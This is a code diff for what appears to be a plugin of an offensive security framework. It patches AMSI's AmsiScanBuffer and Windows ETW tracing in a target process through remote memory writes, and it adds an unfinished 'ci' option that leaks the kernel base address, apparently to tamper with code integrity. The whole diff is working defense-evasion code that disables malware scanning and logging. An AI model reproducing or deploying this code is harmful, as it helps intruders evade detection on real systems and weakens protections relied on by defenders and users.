@@ -1,8 +1,10 @@
 import eternalhush as eh
 from additional.clingyspider import api
 from additional.clingyspider import const
+from additional.clingyspider import extapi
 from additional import memrwlib
 from additional.clingyspider.nt_const import *
+import additional.darknarrator as dana
 import os
 
 FORCE_RET_INSTRUCTION = b"\xc3"
@@ -63,12 +65,26 @@ def patch_amsi(hproc, patch):
     old = api.VirtualProtectEx(hproc, amsiscanbuffer, 4096, const.PAGE_EXECUTE_READWRITE)
     api.WriteMemoryEx(hproc, amsiscanbuffer+patch_offset, patch)
     api.VirtualProtectEx(hproc, amsiscanbuffer, 4096, old)
+#4C 8D 05 6E 1F 46 00
+def patch_ci():
+    if not dana.DANA_IsReady():
+        eh.ui.Echo("DarkNarrator is not loaded/configured", eh.ECHO_ERROR)
+        return
+    
+    ntoskrnl_addr = extapi.InvokeUserExtensionApi(dana.DANA_LEAK_MODULE_ADDR, "\\SystemRoot\\system32\\ntoskrnl.exe")
+    if not ntoskrnl_addr:
+        eh.ui.Echo(f"Failed to leak kernel address ({eh.ui.GetLastError()})", eh.ECHO_ERROR)
+        return
+    eh.ui.Echo(f"Kernel address:\t{hex(ntoskrnl_addr)}", eh.ECHO_DEFAULT)
+    
+    
+
 
 def main(args):
-    if args.protection.lower() != "amsi" and args.protection.lower() != "etw" and args.protection.lower() != "*":
+    if args.protection.lower() not in ['amsi', 'etw', 'ci']:
         eh.ui.Echo("Invalid protection specified. Use .help", eh.ECHO_ERROR)
         return
-    if args.action.lower() != "patch" and args.action.lower() != "restore":
+    if args.action.lower() not in ['patch', 'restore']:
         eh.ui.Echo("Invalid action specified. Use .help", eh.ECHO_ERROR)
         return
     hproc = args.use_handle
@@ -87,16 +103,12 @@ def main(args):
             patch_etw(hproc, FORCE_RET_INSTRUCTION)
         elif args.protection.lower() == "amsi":
             patch_amsi(hproc, JMP_INSTRUCTION)
-        elif args.protection.lower() == "*":
-            patch_etw(hproc, FORCE_RET_INSTRUCTION)
-            patch_amsi(hproc, JMP_INSTRUCTION)
+        elif args.protection.lower() == "ci":
+            patch_ci()
     elif args.action.lower() == "restore":
         if args.protection.lower() == "etw":
             patch_etw(hproc, bytes.fromhex(eh.ui.GetEnv('__PATCHTOOL_NTTRACEEVENT_OLD')))
         elif args.protection.lower() == "amsi":
-            patch_amsi(hproc, bytes.fromhex(eh.ui.GetEnv('__PATCHTOOL_AMSISCANBUFFER_OLD')))
-        elif args.protection.lower() == "*":
-            patch_etw(hproc, bytes.fromhex(eh.ui.GetEnv('__PATCHTOOL_NTTRACEEVENT_OLD')))
             patch_amsi(hproc, bytes.fromhex(eh.ui.GetEnv('__PATCHTOOL_AMSISCANBUFFER_OLD')))
     
 
